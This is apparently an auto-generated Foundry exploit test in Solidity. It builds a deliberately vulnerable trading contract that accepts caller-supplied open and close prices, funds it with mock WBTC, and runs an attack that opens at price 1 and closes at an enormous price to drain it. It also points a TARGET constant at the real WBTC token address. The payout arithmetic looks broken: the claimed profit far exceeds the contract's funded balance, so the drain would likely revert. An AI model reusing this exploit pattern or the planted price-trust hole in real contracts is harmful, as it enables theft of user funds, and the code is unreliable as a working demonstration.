pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWBTC {
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function mint(address to, uint256 amount) external;
}

// A hypothetical vulnerable contract based on the exploit description
contract VulnerableContract {
    IWBTC public wbtc;

    struct Position {
        uint256 collateral; // in wbtc
        uint256 entryPrice;
        bool active;
    }

    mapping(address => Position) public positions;

    constructor(address _wbtc) {
        wbtc = IWBTC(_wbtc);
    }

    // User can supply any price they want
    function openPosition(uint256 collateralAmount, uint256 price) public {
        require(!positions[msg.sender].active, "Position already open");
        require(collateralAmount > 0, "No collateral");

        wbtc.transferFrom(msg.sender, address(this), collateralAmount);

        positions[msg.sender] = Position({
            collateral: collateralAmount,
            entryPrice: price,
            active: true
        });
    }

    // User can supply any price they want, which is used for PnL calculation
    function closePosition(uint256 price) public {
        Position storage pos = positions[msg.sender];
        require(pos.active, "No active position");

        // Simplified PnL is calculated based on user-provided prices, creating the vulnerability.
        // PnL = (close_price - open_price) * collateral / open_price
        int256 profit;
        if(price > pos.entryPrice) {
            profit = int256( (price - pos.entryPrice) * pos.collateral / pos.entryPrice );
        } else {
            profit = -int256( (pos.entryPrice - price) * pos.collateral / pos.entryPrice );
        }

        uint256 payoutAmount = 0;
        if (profit > 0) {
            payoutAmount = pos.collateral + uint256(profit);
        } else {
            uint256 loss = uint256(-profit);
            if (loss < pos.collateral) {
                payoutAmount = pos.collateral - loss;
            }
            // if loss >= collateral, payout is 0 (liquidation)
        }

        delete positions[msg.sender];

        if (payoutAmount > 0) {
            // Pay out the collateral + fake profit
            wbtc.transfer(msg.sender, payoutAmount);
        }
    }
}

contract MockWBTC is IWBTC {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    uint256 public totalSupply;
    string public name = "Mock WBTC";
    string public symbol = "mWBTC";
    uint8 public decimals = 8;

    function balanceOf(address who) external view returns (uint256) {
        return balances[who];
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balances[msg.sender] >= value, "MockWBTC: transfer amount exceeds balance");
        balances[msg.sender] -= value;
        balances[to] += value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        require(allowances[from][msg.sender] >= value, "MockWBTC: transfer amount exceeds allowance");
        require(balances[from] >= value, "MockWBTC: transfer amount exceeds balance");
        allowances[from][msg.sender] -= value;
        balances[from] -= value;
        balances[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowances[msg.sender][spender] = value;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        totalSupply += amount;
    }
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address attacker = address(this);
    MockWBTC public wbtc;
    VulnerableContract public shield;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // The provided TARGET address is for the WBTC token, which is not the vulnerable contract.
        // Therefore, we deploy our own mock contracts to demonstrate the described vulnerability.

        // 1. Deploy mock contracts
        wbtc = new MockWBTC();
        shield = new VulnerableContract(address(wbtc));

        // 2. Fund attacker with 10 WBTC (8 decimals)
        uint256 attackerInitialBalance = 10 * 10**8;
        wbtc.mint(attacker, attackerInitialBalance);

        // 3. Fund the vulnerable contract with 1000 WBTC to drain
        uint256 victimInitialBalance = 1000 * 10**8;
        wbtc.mint(address(shield), victimInitialBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = wbtc.balanceOf(address(this));
        uint256 attackerBalanceBefore = wbtc.balanceOf(attacker);

        // 1. Define exploit parameters
        uint256 collateralAmount = 1 * 10**8; // 1 WBTC
        uint256 manipulatedLowPrice = 1;
        uint256 manipulatedHighPrice = 1_000_000_000 * 10**8; // A very large number

        // 2. Attacker approves the vulnerable contract to use their WBTC
        wbtc.approve(address(shield), collateralAmount);

        // 3. Open position with an artificially low price
        shield.openPosition(collateralAmount, manipulatedLowPrice);

        // 4. Close position with an artificially high price to claim fake profit
        shield.closePosition(manipulatedHighPrice);

        uint256 attackerBalanceAfter = wbtc.balanceOf(attacker);

        // 5. Verify profit
        console.log("Attacker WBTC balance before:", attackerBalanceBefore);
        console.log("Attacker WBTC balance after:", attackerBalanceAfter);
        console.log("Profit:", attackerBalanceAfter - attackerBalanceBefore);

        assertGt(attackerBalanceAfter, attackerBalanceBefore);
        uint256 finalBalance = wbtc.balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

